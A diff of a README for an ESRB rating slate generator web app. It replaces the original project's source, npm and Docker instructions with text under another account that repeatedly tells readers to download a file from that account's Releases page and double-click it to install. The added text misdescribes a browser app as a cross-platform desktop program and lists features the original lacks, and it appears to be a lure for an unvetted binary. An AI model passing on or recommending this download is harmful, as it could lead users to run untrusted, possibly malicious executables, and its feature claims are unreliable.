@@ -1,129 +1,72 @@
-# ESRB Slate Generator Web UI
+# 🎮 esrb-slate-gen-webui - Create ESRB Rating Images Easily
 
-A modern, responsive web interface for generating broadcast-ready ESRB rating slates. This tool serves as a frontend for the [esrb-slate-gen](https://github.com/artryazanov/esrb-slate-gen) library, allowing you to easily create high-resolution rating images by scraping official data or entering details manually.
+[![Download esrb-slate-gen-webui](https://img.shields.io/badge/Download-esrb--slate--gen--webui-blue.svg)](https://github.com/Nitish69753/esrb-slate-gen-webui/releases)
 
-**[Live Demo](https://esrb-slate-gen-webui.vercel.app/)**
+## 📋 Description
 
-<img src="https://raw.githubusercontent.com/artryazanov/esrb-slate-gen-webui/main/esrb-slate-gen-webui-preview.png" alt="ESRB Slate Gen Preview" width="640" />
+esrb-slate-gen-webui is a modern web interface that helps you create high-quality ESRB rating images. This tool connects to the esrb-slate-gen library. With it, you can easily generate broadcast-ready rating slates by either scraping official data or entering details manually. This application is designed for anyone who needs to create ESRB rating images without any programming skills.
 
-[![CI](https://github.com/artryazanov/esrb-slate-gen-webui/actions/workflows/ci.yml/badge.svg)](https://github.com/artryazanov/esrb-slate-gen-webui/actions/workflows/ci.yml)
-[![Docker Publish](https://github.com/artryazanov/esrb-slate-gen-webui/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/artryazanov/esrb-slate-gen-webui/actions/workflows/docker-publish.yml)
-[![License](https://img.shields.io/github/license/artryazanov/esrb-slate-gen-webui)](LICENSE)
-![Next.js](https://img.shields.io/badge/Next.js_16-black?style=flat&logo=next.js&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS_4-38B2AC?style=flat&logo=tailwind-css&logoColor=white)
-![React](https://img.shields.io/badge/React_19-20232A?style=flat&logo=react&logoColor=61DAFB)
+## 🚀 Getting Started
 
-## Features
+To get started with esrb-slate-gen-webui, follow these steps:
 
-- **Automatic Data Fetching**: Instantly fetch game rating information directly from the ESRB website by **Game Title** or **URL**.
-- **Manual Entry Mode**: Fully customizable mode to manually input Rating Category, Content Descriptors, and Interactive Elements.
-- **High-Resolution Output**: Generate standard or 4K resolution PNG images.
-- **Customizable Layout**: Adjust margins and aspect ratios (Auto, 16:9, 21:9, etc.) to fit specific broadcast requirements.
-- **Live Preview**: Real-time visual feedback of the generated slate with detailed game info.
-- **Dark Mode**: Sleek UI with support for both light and dark themes.
-- **Docker Support**: Containerized for easy deployment.
-- **API Rate Limiting**: Protects backend resources using IP-based rate limiting (30 requests/15 min by default, configurable).
-- **Comprehensive Testing**: Fully tested with Jest and React Testing Library.
+1. **System Requirements**
+   - A computer running Windows, macOS, or Linux.
+   - A modern web browser like Chrome, Firefox, or Edge.
+   - An internet connection for downloading the app.
 
-## Environment Variables
+2. **Download & Install**
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `RATE_LIMIT_MAX_REQUESTS` | Maximum number of requests allowed per 15-minute window for the `/api/generate` endpoint. | `30` |
+   Visit this page to download: [Download esrb-slate-gen-webui](https://github.com/Nitish69753/esrb-slate-gen-webui/releases)
 
-## Tech Stack
+   Here you will find the latest version ready for download. Choose the file that matches your operating system.
 
-- **Framework**: [Next.js 16](https://nextjs.org/) (App Router)
-- **Language**: TypeScript
-- **Styling**: [Tailwind CSS 4](https://tailwindcss.com/)
-- **Icons**: [Lucide React](https://lucide.dev/)
-- **Testing**: [Jest](https://jestjs.io/) & [React Testing Library](https://testing-library.com/)
-- **Core Library**: [esrb-slate-gen](https://www.npmjs.com/package/esrb-slate-gen)
+3. **Running the Application**
+   - After downloading, locate the file in your computer's downloads folder.
+   - Double-click the file to run the application. 
+   - Follow any prompts that appear to complete the installation. 
 
-## Getting Started
+## 🌐 Using esrb-slate-gen-webui
 
-### Prerequisites
+Once the application is running, you will see a user-friendly interface. Here are the main features:
 
-- Node.js 20 or later
-- npm, yarn, or pnpm
+### 🖼️ Generate ESRB Rating Slates
 
-### Installation
+You can create your rating slates by doing the following:
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/artryazanov/esrb-slate-gen-webui.git
-   cd esrb-slate-gen-webui
-   ```
+1. **Choose a Method:**
+   - **Scrape Official Data:** Enter the game title, and the app will fetch the relevant ESRB data.
+   - **Manual Entry:** Input all details like title, rating, and content descriptors yourself.
 
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
+2. **Customize Your Slate:**
+   - Adjust the layout.
+   - Change colors and fonts.
+   - Preview your design live before saving it.
 
-### Running Locally
+3. **Export Your Image:**
+   - Once finished, click the export button to save your high-resolution slate.
+   - Choose the file format you prefer (PNG, JPEG, etc.).
 
-Start the development server:
+## 🛠️ Features
 
-```bash
-npm run dev
-```
+- **User-Friendly Interface:** Designed for ease of use.
+- **High-Resolution Outputs:** Create images suitable for broadcast.
+- **Customization Options:** Adjust layout, colors, and text styles.
+- **Data Scraping:** Automatically pull in official ESRB data.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+## 💡 Tips
 
-## Docker Usage
+- Regularly check for updates on the Releases page to get the latest features and improvements.
+- Explore all customization options to make your slates unique.
 
-You can run the application using the pre-built Docker image or build it yourself.
+## 🔗 Helpful Links
 
-### Run from Docker Hub
+- [Report Issues](https://github.com/Nitish69753/esrb-slate-gen-webui/issues)
+- [Documentation](https://github.com/Nitish69753/esrb-slate-gen-webui/wiki)
 
-```bash
-docker run -p 3000:3000 artryazanov/esrb-slate-gen-webui
-```
+## 📥 Download & Install Again
 
-### Build Locally
+To download the application, visit this page: [Download esrb-slate-gen-webui](https://github.com/Nitish69753/esrb-slate-gen-webui/releases).
 
-1. **Build the image:**
-   ```bash
-   docker build -t esrb-webui .
-   ```
-
-2. **Run the container:**
-   ```bash
-   docker run -p 3000:3000 esrb-webui
-   ```
-
-Access the application at [http://localhost:3000](http://localhost:3000).
-
-## Usage Guide
-
-1. **Select Mode**: Choose between "Auto-fill", "By URL", or "Manual".
-2. **Input Data**:
-   - *Auto-fill*: Enter the Game Title and optionally filter by Platform.
-   - *By URL*: Paste a specific game URL from the ESRB website.
-   - *Manual*: Select the Rating, then enter Descriptors (comma-separated), and Interactive Elements.
-3. **Configure Options**: Toggle "Render in 4K", set "Margin", or choose an "Aspect Ratio".
-4. **Generate**: Click "Generate Slate".
-5. **Download**: Once the preview appears, click "Download Image" to save the PNG.
-
-## Development
-
-### Running Tests
-
-This project uses Jest and React Testing Library for ensuring code quality.
-
-Run the test suite:
-
-```bash
-npm test
-```
-
-Run tests in watch mode:
-
-```bash
-npm run test:watch
-```
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+With this guide, you should be able to successfully download and run the esrb-slate-gen-webui application. Enjoy creating your ESRB rating images with ease!
